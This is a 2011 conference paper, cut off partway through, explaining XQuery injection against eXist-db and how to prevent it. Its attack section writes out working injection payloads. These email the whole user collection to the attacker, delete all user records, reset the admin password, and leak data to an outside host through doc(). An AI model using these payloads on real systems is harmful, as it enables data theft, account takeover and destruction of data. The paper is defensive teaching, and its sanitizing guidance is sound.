<div id="mainContainerTOC">
   <div id="mainContainerTitleTOC" onclick="$('#mainContainerEntriesTOC').toggle('1000');">Table of Content</div>
   <div id="mainContainerEntriesTOC" style="display:none;">
      <div class="headedContainerTOC">
         <div class="headedContainerTitleTOC"><a href="#XQueryInjectionANCHOR" name="XQueryInjectionTOC">XQuery Injection</a></div>
         <div class="headedContainerTOC">
            <div class="headedContainerTitleTOC"><a href="#CodeInjectionANCHOR" name="CodeInjectionTOC">Code Injection</a></div>
         </div>
         <div class="headedContainerTOC">
            <div class="headedContainerTitleTOC"><a href="#ExampleofXQueryInjectionANCHOR" name="ExampleofXQueryInjectionTOC">Example of XQuery Injection</a></div>
            <div class="headedContainerTOC">
               <div class="headedContainerTitleTOC"><a href="#ScenarioANCHOR" name="ScenarioTOC">Scenario</a></div>
            </div>
            <div class="headedContainerTOC">
               <div class="headedContainerTitleTOC"><a href="#AttackANCHOR" name="AttackTOC">Attack</a></div>
            </div>
         </div>
         <div class="headedContainerTOC">
            <div class="headedContainerTitleTOC"><a href="#ProtectionANCHOR" name="ProtectionTOC">Protection</a></div>
            <div class="headedContainerTOC">
               <div class="headedContainerTitleTOC"><a href="#GenericHowToANCHOR" name="GenericHowToTOC">Generic How To</a></div>
            </div>
            <div class="headedContainerTOC">
               <div class="headedContainerTitleTOC"><a href="#NoFiltersPlease!ANCHOR" name="NoFiltersPlease!TOC">No Filters, Please!</a></div>
            </div>
            <div class="headedContainerTOC">
               <div class="headedContainerTitleTOC"><a href="#JavaANCHOR" name="JavaTOC">Java</a></div>
            </div>
            <div class="headedContainerTOC">
               <div class="headedContainerTitleTOC"><a href="#XPath20EnvironmentsANCHOR" name="XPath20EnvironmentsTOC">XPath 2.0 Environments</a></div>
               <div class="headedContainerTOC">
                  <div class="headedContainerTitleTOC"><a href="#XSLT20ANCHOR" name="XSLT20TOC">XSLT 2.0</a></div>
               </div>
               <div class="headedContainerTOC">
                  <div class="headedContainerTitleTOC"><a href="#XQueryANCHOR" name="XQueryTOC">XQuery</a></div>
               </div>
            </div>
            <div class="headedContainerTOC">
               <div class="headedContainerTitleTOC"><a href="#XFormsANCHOR" name="XFormsTOC">XForms</a></div>
            </div>
            <div class="headedContainerTOC">
               <div class="headedContainerTitleTOC"><a href="#RelatedAttacksANCHOR" name="RelatedAttacksTOC">Related Attacks</a></div>
               <div class="headedContainerTOC">
                  <div class="headedContainerTitleTOC"><a href="#XQueryNumericLiteralInjectionANCHOR" name="XQueryNumericLiteralInjectionTOC">XQuery Numeric Literal Injection</a></div>
               </div>
               <div class="headedContainerTOC">
                  <div class="headedContainerTitleTOC"><a href="#XQueryDirectElementInjectionANCHOR" name="XQueryDirectElementInjectionTOC">XQuery Direct Element Injection</a></div>
               </div>
               <div class="headedContainerTOC">
                  <div class="headedContainerTitleTOC"><a href="#XUpdateinjectionANCHOR" name="XUpdateinjectionTOC">XUpdate injection</a></div>
               </div>
               <div class="headedContainerTOC">
                  <div class="headedContainerTitleTOC"><a href="#*:evaluate()injectionANCHOR" name="*:evaluate()injectionTOC">*:evaluate() injection</a></div>
               </div>
            </div>
         </div>
      </div>
   </div>
</div>
<div id="mainContainerTERMS">
   <div id="mainContainerTitleTERMS" onclick="$('#mainContainerEntriesTERMS').toggle('1000')">Index of Terms</div>
   <div id="mainContainerEntriesTERMS" style="display:none;">
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">a</div>
         <div class="singletermTERMS">AMP</div>
         <div class="singletermTERMS">August 2 - 5, 2011</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">b</div>
         <div class="singletermTERMS">Balisage: The Markup Conference 2011</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">c</div>
         <div class="singletermTERMS">Cross Site Scripting</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">d</div>
         <div class="singletermTERMS">document()</div>
         <div class="singletermTERMS">doc()</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">e</div>
         <div class="singletermTERMS">email</div>
         <div class="singletermTERMS">Expr</div>
         <div class="singletermTERMS">Eric</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">f</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">g</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">h</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">i</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">j</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">k</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">l</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">m</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">n</div>
         <div class="singletermTERMS">not</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">o</div>
         <div class="singletermTERMS">or .='</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">p</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">q</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">r</div>
         <div class="singletermTERMS">resource</div>
         <div class="singletermTERMS">realms</div>
         <div class="singletermTERMS">request:get-parameter()</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">s</div>
         <div class="singletermTERMS">select</div>
         <div class="singletermTERMS">saxon:evaluate</div>
         <div class="singletermTERMS">SQL injection</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">t</div>
         <div class="singletermTERMS">trim()</div>
         <div class="singletermTERMS">toLowerCase()</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">u</div>
         <div class="singletermTERMS">URLEncoder.encode()</div>
         <div class="singletermTERMS">util:eval()</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">v</div>
         <div class="singletermTERMS">vdv@dyomedea.com</div>
         <div class="singletermTERMS">van der Vlist</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">x</div>
         <div class="singletermTERMS">xxforms:variable</div>
         <div class="singletermTERMS">xforms:bind/@calculate</div>
         <div class="singletermTERMS">XMLfr.org</div>
         <div class="singletermTERMS">XQuery Update Facilities</div>
         <div class="singletermTERMS">xmldb;get-child-collections()</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">y</div>
      </div>
      <div class="letterContainerTERMS">
         <div class="letterlableTERMS">z</div>
      </div>
   </div>
</div>
<div id="mainContainerIML"><a name="XQueryInjectionANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="article e0" version="5.0-subset Balisage-1.3">
      <div class="title e1">XQuery Injection</div>
      <div class="subtitle e2">Easy to exploit, easy to prevent...</div>
      <div class="info e3">
         <div class="confgroup e4">
            <div class="conftitle e5">Balisage: The Markup Conference 2011</div>
            <div class="confdates e6">August 2 - 5, 2011</div>
         </div>
         <div class="abstract e7">
            <div class="para e8">We all know (and worry) about SQL injection, but should we also worry about XQuery
               injection?
            </div>
            <div class="para e9">With the power of extension functions and the implementation of XQuery update features,
               the answer is clearly yes! We will see how an attacker can send information to an
               external site or
               erase a collection through XQuery injection on a naive and unprotected application
               using the eXist-db REST API.
            </div>
            <div class="para e10">That's the bad news...</div>
            <div class="para e11">The good news is that it's quite easy to protect your application from XQuery injection
               after this word of warning. We'll discuss a number of simple techniques (literal string
               escaping,
               wrapping values into elements or moving them out of queries in HTTP parameters) and
               see how to implement them in different environments covering traditional programming
               languages, XSLT, XForms
               and pipeline languages.
            </div>
         </div>
         <div class="author e12">
            <div class="personname e13">
               <div class="firstname e14">Eric</div>
               <div class="surname e15">van der Vlist</div>
            </div>
            <div class="personblurb e16">
               <div class="para e17">Eric is an independent consultant and trainer. His domain of expertise includes Web
                  development and XML technologies.
               </div>
               <div class="para e18">He is the creator and main editor of 
                  <div xmlns:xlink="http://www.w3.org/1999/xlink" class="link e19" xlink:actuate="onRequest" xlink:href="http://xmlfr.org" xlink:show="new" xlink:type="simple">XMLfr.org</div>, the main site dedicated to XML technologies in French, the author of the O'Reilly
                  animal books XML
                  Schema and RELAX NG and a member or the ISO DSDL (
                  <div xmlns:xlink="http://www.w3.org/1999/xlink" class="link e20" xlink:actuate="onRequest" xlink:href="http://dsdl.org" xlink:show="new" xlink:type="simple">http://dsdl.org</div>) working group focused on XML schema languages.
               </div>
               <div class="para e21">He is based in Paris and you can reach him by mail (
                  <div xmlns:xlink="http://www.w3.org/1999/xlink" class="link e22" xlink:actuate="onRequest" xlink:href="mailto:vdv@dyomedea.com" xlink:show="new" xlink:type="simple">vdv@dyomedea.com</div>) or meet him at one of the many conferences where he presents his
                  projects.
               </div>
            </div>
            <div class="affiliation e23">
               <div class="orgname e24">Dyomedea</div>
            </div>
         </div>
         <div class="legalnotice e25">
            <div class="para e26">Copyright © 2011 by the author. Used with permission.</div>
         </div>
      </div>
      <div class="note e27">
         <div class="para e28">I am not a security expert and, as far as I know, the domain covered by this paper
            is very new. The list of attacks and counter attacks mentioned hereafter is nothing
            more than the list of
            attacks and counter attacks I can think of. This list is certainly 
            <div class="emphasis e29">not</div> exhaustive and following its advise is by no means a guarantee that you'll be safe!
            If you see (or
            think of) other attacks or solutions, drop me an 
            <div xmlns:xlink="http://www.w3.org/1999/xlink" class="link e30" xlink:actuate="onRequest" xlink:href="mailto:vdv@dyomedea.com" xlink:show="new" xlink:type="simple">email</div> so that I may improve the next versions of this document.
         </div>
      </div>
      <div class="para e31">Many thanks to Alessandro Vernet (Orbeon) for the time he has spent discussing these
         issues with me and for suggesting to rely on query string parameters and to Adam Retter
         (eXist-db
         developer) for his thorough review of this paper!
      </div><a name="CodeInjectionANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e32">
         <div class="title e33">Code Injection</div>
         <div class="para e34">Wikipedia defines code injection as:</div>
         <div class="para e35">
            <div class="citation e36">the exploitation of a computer bug that is caused by processing invalid data. Code
               injection can be used by an attacker to introduce (or "inject") code into a computer
               program to
               change the course of execution. The results of a code injection attack can be disastrous.
               For instance, code injection is used by some computer worms to propagate.
            </div>
         </div>
         <div class="para e37">
            <div xmlns:xlink="http://www.w3.org/1999/xlink" class="link e38" xlink:actuate="onRequest" xlink:href="http://en.wikipedia.org/wiki/SQL_injection" xlink:show="new" xlink:type="simple">SQL injection</div> is arguably the most common example of code injection since it can potentially affect
            any web application or
            website accessing a SQL database including all the widespread 
            <div xmlns:xlink="http://www.w3.org/1999/xlink" class="link e39" xlink:actuate="onRequest" xlink:href="http://en.wikipedia.org/wiki/AMP_%28solution_stack%29" xlink:show="new" xlink:type="simple">AMP</div> systems.
         </div>
         <div class="para e40">The second well known example of code injection is 
            <div xmlns:xlink="http://www.w3.org/1999/xlink" class="link e41" xlink:actuate="onRequest" xlink:href="http://en.wikipedia.org/wiki/Cross-site_scripting" xlink:show="new" xlink:type="simple">Cross Site Scripting</div> (XSS) which could be called "HTML and
            JavaScript injection".
         </div>
         <div class="para e42">According to the 
            <div xmlns:xlink="http://www.w3.org/1999/xlink" class="link e43" xlink:actuate="onRequest" xlink:href="http://projects.webappsec.org/w/page/13246995/Web-Hacking-Incident-Database" xlink:show="new" xlink:type="simple">Web Hacking Incident Database</div>, SQL injection is the number one attack
            method involved in 20% of the web attacks and Cross Site Scripting is number two with
            13% suggesting that code injection techniques are involved in more than 1 out of 3
            attacks on the web. 
         </div>
         <div class="para e44">If it's difficult to find any mention of XQuery injection on the web, it's probably
            because so few websites are powered by XML databases but also because of the false
            assumption that XQuery
            is a read only language and that its expression power is limited, meaning that the
            consequences of XQuery injection attacks would remain limited. 
         </div>
         <div class="para e45">This assumption must be revised now that XML databases have started implementing 
            <div xmlns:xlink="http://www.w3.org/1999/xlink" class="link e46" xlink:actuate="onRequest" xlink:href="http://www.w3.org/TR/xquery-update-10/" xlink:show="new" xlink:type="simple">XQuery Update Facilities</div> and that XQuery
            engines (either databases, libraries such as Saxon or middleware such as BEA Weblogic)
            have extensive extension function libraries which let them communicate with the external
            world!
            Furthermore, when you think about it, even the good old XSLT 1.0 
            <div class="code e47">document()</div> function or its XPath 2.0/XQuery 1.0 
            <div class="code e48">doc()</div> friend are potential risks. 
         </div>
      </div><a name="ExampleofXQueryInjectionANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e49">
         <div class="title e50">Example of XQuery Injection</div><a name="ScenarioANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e51">
            <div class="title e52">Scenario</div>
            <div class="para e53">If you develop an application that requires user interaction, you will probably need
               sooner or later some kind of user authentication, and if your application is powered
               by an XML
               database, you may want to store user information in this database.
            </div>
            <div class="note e54">
               <div class="para e55">There are two ways to rely on a database for user authentication: you can either store
                  user and password information in the database (like any other information) or rely
                  on the database
                  internal security mechanism. The authentication method used in this example just stores
                  user and password information in the database.
               </div>
            </div>
            <div class="para e56">In the Java world, Tomcat comes with a number of so called authentication "
               <div xmlns:xlink="http://www.w3.org/1999/xlink" class="link e57" xlink:actuate="onRequest" xlink:href="http://tomcat.apache.org/tomcat-6.0-doc/realm-howto.html" xlink:show="new" xlink:type="simple">realms</div>" for plain files, SQL
               databases or LDAP but there is no realm to use an XML database to store authentication
               information.
            </div>
            <div class="para e58">That's not really an issue since the realm interface is easy to implement. This interface
               has been designed so that you can store the passwords either as plain text or encrypted.
               Of
               course, it's safer (and recommended) to store encrypted passwords, but for the sake
               of this example, let's say you are lazy and store them as plain text. I'll spare you
               the details, but the
               real meat in your XML database realm will then be to return the password and roles
               for a user with a given login name.
            </div>
            <div class="para e59">If you are using an XML database such as eXist with its REST API, you will end up
               opening an URL with a Java statement such as:
            </div>
            <div class="programlisting e60" xml:space="preserve">new URL("http://localhost:8080/orbeon/exist/rest/db/app/users/?_query=//user[mail=%27"
               + username + "%27]")
            </div>
         </div><a name="AttackANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e61">
            <div class="title e62">Attack</div>
            <div class="para e63">Let's put on a black hat and try to attack a site powered by an XML database that
               gives us a login screen such as this one:
            </div>
            <div class="figure e64" xml:id="screenshot_login">
               <div class="title e65">Login Screen</div>
               <div class="mediaobject e66">
                  <div class="imageobject e67">
                     <div class="metaBox e68"><img src="resources/manbluflag.jpg" class="metaImage" onclick="$('#d1e130').toggle('1000');" alt="Marker: click here for details..." title="Marker: click here for details..."><div id="d1e130" class="metaSource" style="display:none;">                
                           &lt;imagedata<span class="metaAttribute">class='e68'
                              </span><span class="metaAttribute">fileref='../../../vol7/graphics/Vlist02/Vlist02-001.png'
                              </span>
                           &gt;
                           
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="para e69">We don't know the precise statement used by the realm to retrieve information or the
               database structure, but we assume that the authentication injects the content of HTML
               form somewhere
               into an XQuery as a literal string and hope the injection is done without proper sanitization.
            </div>
            <div class="para e70">We don't know either if the programmer has used a single or a double quote to isolate
               the content of the input form, but since that makes only two possibilities, we will
               just try
               both.
            </div>
            <div class="para e71">The trick is:</div>
            <div class="orderedlist e72">
               <div class="listitem e73">
                  <div class="para e74">to close the literal string with a single or double quote</div>
               </div>
               <div class="listitem e75">
                  <div class="para e76">to add whatever is needed to avoid to raise an XQuery parsing error</div>
               </div>
               <div class="listitem e77">
                  <div class="para e78">to add the XQuery statement that will carry the attack</div>
               </div>
               <div class="listitem e79">
                  <div class="para e80">to add again whatever is needed to avoid to raise a parsing error</div>
               </div>
               <div class="listitem e81">
                  <div class="para e82">to open again a literal string using the same quote</div>
               </div>
            </div>
            <div class="para e83">Let's take care of the syntactic sugar first.</div>
            <div class="para e84">We'll assume that the XQuery expression is following this generic pattern:</div>
            <div class="programlisting e85" xml:space="preserve">&lt;URL&gt;?_query=&lt;PATH&gt;[&lt;SUBPATH&gt; = ' &lt;entry value&gt; ']</div>
            <div class="para e86">Our entry value can follow this other pattern:</div>
            <div class="programlisting e87" xml:space="preserve">' or &lt;ATTACK&gt; or .='</div>
            <div class="para e88">After injection, the XQuery expression will look like:</div>
            <div class="programlisting e89" xml:space="preserve">&lt;URL&gt;?_query=&lt;PATH&gt;[&lt;SUBPATH&gt; = '' or &lt;ATTACK&gt; or .='']</div>
            <div class="para e90">The inner or expression has 3 alternatives. The first one will likely return false
               (the &lt;SUBPATH&gt; is meant to be the relative path to the user name and most applications
               won't tolerate
               empty user names in their databases. The XQuery processor will thus pull the trigger
               and evaluate the attack statement.
            </div>
            <div class="para e91">The attack must be an XQuery "
               <div xmlns:xlink="http://www.w3.org/1999/xlink" class="link e92" xlink:actuate="onRequest" xlink:href="http://www.w3.org/TR/xquery/#prod-xquery-Expr" xlink:show="new" xlink:type="simple">Expr</div>" production. That includes FLOWR expressions, but excludes declarations that belong
               to the prologue. In practice, that means that we can't use declare namespace declarations
               and that we need to embed an extension functions call into elements that declare their
               namespaces.
            </div>
            <div class="para e93">What kind of attack can we inject?</div>
            <div class="para e94">The first kind of attacks we can try won't break anything but export information from
               the database to the external world.
            </div>
            <div class="para e95">With eXist, this is possible using standard extension modules such as the HTTP client
               module or the mail module. These modules can be activated or deactivated in the eXist
               configuration
               file and we can't be sure that the attack will work but if one of them is activated
               we'll be able to export the user collection...
            </div>
            <div class="para e96">An attack based on the mail module looks like the following:</div>
            <div class="programlisting e97" xml:space="preserve">&lt;foo xmlns:mail='http://exist-db.org/xquery/mail'&gt;
               {
               let $message :=
               &lt;mail xmlns:util='http://exist-db.org/xquery/util'&gt;
               &lt;from&gt;vdv@dyomedea.com&lt;/from&gt;
               &lt;to&gt;vdv@dyomedea.com&lt;/to&gt;
               &lt;subject&gt;eXist collection&lt;/subject&gt;
               &lt;message&gt;
               &lt;text&gt;The collection is :
               {util:serialize(/*, ())}
               &lt;/text&gt;
               &lt;/message&gt;
               &lt;/mail&gt;
               
               return mail:send-email($message, 'localhost', ()) 
               }
               &lt;/foo&gt;
            </div>
            <div class="para e98">A similar attack could send the content of the collection on pastebin.com using the
               HTTP client module.
            </div>
            <div class="para e99">To inject the attack, we concatenate the start container string (
               <div class="code e100">' or </div>), the attack itself and the end container string (
               <div class="code e101"> or .='</div>), normalize the spaces and paste
               the result into the login entry field.
            </div>
            <div class="para e102">The login screen will return a login error, but if we've been lucky we will receive
               a mail with the full content of the collection on which the query has been run.
            </div>
            <div class="para e103">If nothing happened, we might have used the wrong quote and we can try again replacing
               the single quotes from our container string by double quotes.
            </div>
            <div class="para e104">If nothing happens once again, which is the case with the naive REST URL construction
               used in this example, this might be because the application does not encode the query
               for URI. In that
               case, we must do it ourselves and encode the string before copying it into the entry
               field like the XPath 2.0 encode-for-uri() would do.
            </div>
            <div class="para e105">And then, bingo:</div>
            <div class="figure e106" xml:id="screenshot_new_message">
               <div class="title e107">New message!</div>
               <div class="mediaobject e108">
                  <div class="imageobject e109">
                     <div class="metaBox e110"><img src="resources/manbluflag.jpg" class="metaImage" onclick="$('#d1e209').toggle('1000');" alt="Marker: click here for details..." title="Marker: click here for details..."><div id="d1e209" class="metaSource" style="display:none;">                
                           &lt;imagedata<span class="metaAttribute">class='e110'
                              </span><span class="metaAttribute">fileref='../../../vol7/graphics/Vlist02/Vlist02-002.png'
                              </span>
                           &gt;
                           
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="para e111">We have a new message with all the information we need to login:</div>
            <div class="figure e112" xml:id="screenshot_mail">
               <div class="title e113">The mail</div>
               <div class="mediaobject e114">
                  <div class="imageobject e115">
                     <div class="metaBox e116"><img src="resources/manbluflag.jpg" class="metaImage" onclick="$('#d1e217').toggle('1000');" alt="Marker: click here for details..." title="Marker: click here for details..."><div id="d1e217" class="metaSource" style="display:none;">                
                           &lt;imagedata<span class="metaAttribute">class='e116'
                              </span><span class="metaAttribute">fileref='../../../vol7/graphics/Vlist02/Vlist02-003.png'
                              </span>
                           &gt;
                           
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="para e117">The second kind of attack we can try uses the same technique deletes information from
               the database. A very simple and extreme one just erases anything from the collection
               and leaves empty
               document elements:
            </div>
            <div class="programlisting e118" xml:space="preserve">for $u in //user return update delete $u/(@*|node()</div>
            <div class="para e119">Note that, in both cases, we have not assumed anything about the database structure!</div>
            <div class="para e120">SQL injection attacks often try to generate errors messages that are displayed within
               the resulting HTML pages by careless sites and expose information about the database
               structure but
               that hasn't been necessary so far.
            </div>
            <div class="para e121">On this authentication form, generating errors would have been hopeless since Tomcat
               handles this safely and only exposes a "yes/no" answer to user entries and sends error
               messages to the
               server log but on other forms this could also be an option, leading to a third kind
               of attacks.
            </div>
            <div class="para e122">If we know the database structure for any reason (this could be because we've successfully
               leaked information in error messages, because the application's code is open sourced
               or because
               you've managed to introspect the database using functions such as 
               <div xmlns:xlink="http://www.w3.org/1999/xlink" class="link e123" xlink:actuate="onRequest" xlink:href="http://demo.exist-db.org/exist/functions/xmldb/get-child-collections" xlink:show="new" xlink:type="simple">xmldb;get-child-collections()</div>), we
               can also update user information with forged authentication data:
            </div>
            <div class="programlisting e124" xml:space="preserve">    let $u := //user[role='orbeon-admin'][1]
               return (
               update value $u/mail with 'eric@example.com',
               update value $u/password with 'foobar'
               ) 
            </div>
            <div class="para e125">What about the 
               <div class="code e126">doc()</div> function?
            </div>
            <div class="para e127">It can be used to leak information to the external world:</div>
            <div class="programlisting e128" xml:space="preserve">'foo' = doc(concat('http://myserver.example.com/?root=', name(/*[1])))</div>
         </div>
      </div><a name="ProtectionANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e129">
         <div class="title e130">Protection</div>
         <div class="para e131">Now that we've seen the harm that these attacks can do, what can we do to prevent
            them?
         </div>
         <div class="para e132">A first set of recommendations is to limit the consequences of these attacks:</div>
         <div class="orderedlist e133">
            <div class="listitem e134">
               <div class="para e135">Do not store non encrypted passwords.</div>
            </div>
            <div class="listitem e136">
               <div class="para e137">Use a user with read only permissions to perform read only queries.</div>
            </div>
            <div class="listitem e138">
               <div class="para e139">Do not enable extensions modules unless you really need them.</div>
            </div>
         </div>
         <div class="para e140">If the authentication realm of our example had followed these basic recommendations,
            our attacks would have had limited consequences:
            <div class="itemizedlist e141">
               <div class="listitem e142">
                  <div class="para e143">If the database user used to query the database has no write access the attacker wouldn't
                     have been able to erase the user information.
                  </div>
               </div>
               <div class="listitem e144">
                  <div class="para e145">If the extensions modules that allow to send mails, the attacker wouldn't have been
                     able to send a mail.
                  </div>
               </div>
            </div>These recommendations are always worth to follow. They can be compared to recommending
            to avoid leaving valuables in a room but there are cases when you need to do so and
            that
            doesn't mean that you shouldn't put a lock on the room's door!
         </div>
         <div class="para e146">To block the attacks themselves, we need a way to avoid the values being copied into
            the XQuery expressions leaking out of the literal strings where they are supposed
            to be located.
         </div><a name="GenericHowToANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e147">
            <div class="title e148">Generic How To</div>
            <div class="para e149">The most common way to block these kind of attacks is to "escape" the dangerous characters
               or "sanitize" user inputs before sending them to the XQuery engine.
            </div>
            <div class="para e150">In an XQuery string literal, the "dangerous" characters are:</div>
            <div class="orderedlist e151">
               <div class="listitem e152">
                  <div class="para e153">The 
                     <div class="code e154">&amp;</div> that can be used to make references to predefined or digital entities and needs to
                     be replaced by the 
                     <div class="code e155">&amp;amp;</div>
                  </div>
               </div>
               <div class="listitem e156">
                  <div class="para e157">The quote (either simple or double) that you use to delimit the literal that needs
                     to be replaced by 
                     <div class="code e158">&amp;apos;</div> or 
                     <div class="code e159">&amp;quot;</div>
                     
                  </div>
               </div>
            </div>
            <div class="para e160">And that's all! These two replacements are enough to block code injections through
               string literals.
            </div>
            <div class="para e161">Of course, you also need to use a function such as encode-for-uri() so that the URL
               remains valid and to block injections through URL encoding. 
            </div>
            <div class="para e162">The second way to block these attacks is to keep the values that are entered through
               web forms out of the query itself.
            </div>
            <div class="para e163">When using eXist, this can be done by encoding these values and sending them as URL
               query parameters. These parameters can then be retrieved using the 
               <div xmlns:xlink="http://www.w3.org/1999/xlink" class="link e164" xlink:actuate="onRequest" xlink:href="http://demo.exist-db.org/exist/functions/request/get-parameter" xlink:show="new" xlink:type="simple">request:get-parameter()</div> extension function.
            </div>
            <div class="para e165">Which of these methods should we use?</div>
            <div class="para e166">There is no general rules and it's rather a matter of taste. That being said...</div>
            <div class="itemizedlist e167">
               <div class="listitem e168">
                  <div class="para e169">Sanitizing is more portable: request:get-parameter is an eXist specific function that
                     cannot be used with other databases.
                  </div>
               </div>
               <div class="listitem e170">
                  <div class="para e171">Parameters may (arguably) be considered cleaner since they separate the inputs from
                     the request. They can also be used to call stored queries.
                  </div>
               </div>
            </div>
            <div class="note e172">
               <div class="para e173">These techniques are efficient and enough to protect your application as long as you
                  don't open a new breach. This is the case when your XQuery expression dynamically
                  executes something
                  against a query engine.
               </div>
               <div class="para e174">In a highly hypothetical case where the XQuery expression would execute a SQL query,
                  this SQL Query would have to be protected against SQL injection.
               </div>
               <div class="para e175">A more common case in XQuery land is when you use a *:evaluate() extension function
                  to dynamically execute an XPath or XQuery expression.
               </div>
               <div class="para e176">In that case (see 
                  <div class="xref e177" linkend="evaluate"></div>) the expression needs to be further sanitized!
               </div>
            </div>
         </div><a name="NoFiltersPlease!ANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e178">
            <div class="title e179">No Filters, Please!</div>
            <div class="para e180">It is common to see developers filtering values as a protection against SQL Injection
               and you could also do that as a protection against XQuery injection but in both cases
               this is often a
               bad idea!
            </div>
            <div class="para e181">Filtering user input is often a bad idea and whenever you do so you should be doing
               that for data quality reasons and not for security reasons since the constraints will
               very likely be
               different.
            </div>
            <div class="para e182">To protect this application against XQuery injection, we could have filtered out the
               user input to exclude simple quotes and that would have been effective (assuming we
               use a simple quote
               to delimit the string literal) but that would have given Tim O'Reilly a new opportunity
               to rant against dumb applications that do not accept is name as an input!
            </div>
            <div class="para e183">We've seen that it's as easy to sanitize user input than it would have been to filter
               it, so please, don't use filters for security!
            </div>
         </div><a name="JavaANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e184">
            <div class="title e185">Java</div>
            <div class="para e186">Assuming that we use single quotes to delimit XQuery string literals, inputs can be
               sanitized in Java using this function:
            </div>
            <div class="programlisting e187" xml:space="preserve">    static String sanitize(String text) {
               return text.replace("&amp;", "&amp;amp;").replace("'", "&amp;apos;");
               }
            </div>
            <div class="para e188">Each user input must be sanitized separately and the whole query must then be encoded
               using the 
               <div class="code e189">URLEncoder.encode()</div> method. Depending on the context, it may also be a good
               idea to call an additional method such as 
               <div class="code e190">trim()</div> to remove leading and trailing space or 
               <div class="code e191">toLowerCase()</div> to normalize the value to lower case. In the authentication
               realm, the Java snippet could be:
            </div>
            <div class="programlisting e192" xml:space="preserve">     String query = URLEncoder.encode("//user[mail='" + sanitize(username.trim().toLowerCase())
               + "']", "UTF-8");
               reader.parse(new InputSource(
               new URL("http://localhost:8080/orbeon/exist/rest/db/app/users/?_query=" + query).openStream()));
            </div>
            <div class="para e193">To use request parameters, the query and each of the parameters need to be encoded
               separately:
            </div>
            <div class="programlisting e194" xml:space="preserve">     String query = URLEncoder.encode(
               "declare namespace request='http://exist-db.org/xquery/request';//user[mail=request:get-parameter('mail',
               0)]",
               "UTF-8");
               String usernameNormalized = URLEncoder.encode(username.trim().toLowerCase(), "UTF-8");
               reader.parse(new InputSource(
               new URL("http://localhost:8080/orbeon/exist/rest/db/app/users/?mail="+ usernameNormalized
               + "&amp;_query=" + query).openStream()));
            </div>
            <div class="para e195">To query is now a fixed string that could be stored in the eXist database or encoded
               in a static variable.
            </div>
         </div><a name="XPath20EnvironmentsANCHOR" href="#mainContainerTitleTOC" class="anchor">toc</a><div class="section e196">
            <div class="title e197">XPath 2.0 Environments</div>
            <div class="para e198">In environments that rely on XPath 2.0 such as XSLT 2.0, XProc, XPL,... the same patterns
               can be used if we replace the Java methods with their XPath 2.0 equivalents. In XSLT
               2.0 it is
               possible to define a sanitize function similar to the one we've created in Java but
               this isn't the case for other host languages and we'll skip this step.
            </div>
            <div class="para e199">To sanitize user inputs in an XPath 2.0 host language, we need to add a level of escaping
               because the 
               <div class="code e200">&amp;</div> character is not available directly but through the
               
               <div class="code e201">&amp;amp;</div> entity reference. The XQuery query combines simple and double quotes that are not
               very easy to handle in a 
               <div class="code e202">select</div> attribute (even if the escaping rules of
               XPath 2.0 help a lot) and the query pieces can be put into variables for convenience.
               That being said, the user input can be sanitized using statements such as:
            </div>
            <div class="programlisting e203" xml:space="preserve">        &lt;xsl:variable name="usernameSanitized"
               select="lower-case(normalize-space(replace(replace($username, '&amp;amp;', '&amp;amp;amp;'),
               '''', '&amp;amp;apos;')))"/&gt;
               &lt;xsl:variable name="queryStart"&gt;//user[mail='&lt;/xsl:variable&gt;
               &lt;xsl:variable name="queryEnd"&gt;']&lt;/xsl:variable&gt;
               &lt;xsl:variable name="query" select="encode-for-uri(concat($queryStart, $usernameSanitized,
               $queryEnd))"/&gt;
               &lt;xsl:variable name="userInformation" 
               select="doc(concat('http://localhost:8080/orbeon/exist/rest/db/app/users/?_query=',
               $query))"/&gt;
               
            </div>
            <div class="para e204">To use request parameters, simply write something such as:</div>
            <div class="programlisting e205" xml:space="preserve">        &lt;xsl:variable name="usernameNormalized" select="lower-case(normalize-space($username))"/&gt;
               &lt;xsl:variable name="query"&gt;
               declare namespace request='http://exist-db.org/xquery/request';
               //user[mail=request:get-parameter('mail',0)]&lt;/xsl:variable&gt;
               &lt;xsl:variable name="userInformation"
               select="doc(concat('http://localhost:8080/orbeon/exist/rest/db/app/users/?mail=',
               
